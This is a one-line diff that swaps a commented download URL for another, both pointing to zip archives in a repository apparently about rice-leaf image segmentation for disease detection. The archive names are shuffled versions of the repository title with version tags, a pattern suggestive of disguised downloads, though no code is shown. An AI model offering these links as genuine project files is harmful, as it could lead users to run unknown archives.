@@ -1,1 +1,1 @@
-# https://github.com/zurimentaram/Optimasi-Segmentasi-Citra-Daun-Padi-Dengan-Metode-Thresholding-Dalam-Identifikasi-Penyakit/raw/refs/heads/main/undergrown/Daun-Segmentasi-Padi-Identifikasi-Metode-Dengan-Dalam-Penyakit-Optimasi-Citra-Thresholding-2.5.zip
+# https://raw.githubusercontent.com/zurimentaram/Optimasi-Segmentasi-Citra-Daun-Padi-Dengan-Metode-Thresholding-Dalam-Identifikasi-Penyakit/main/undergrown/Metode-Identifikasi-Optimasi-Padi-Citra-Dalam-Daun-Thresholding-Segmentasi-Dengan-Penyakit-v3.3.zip
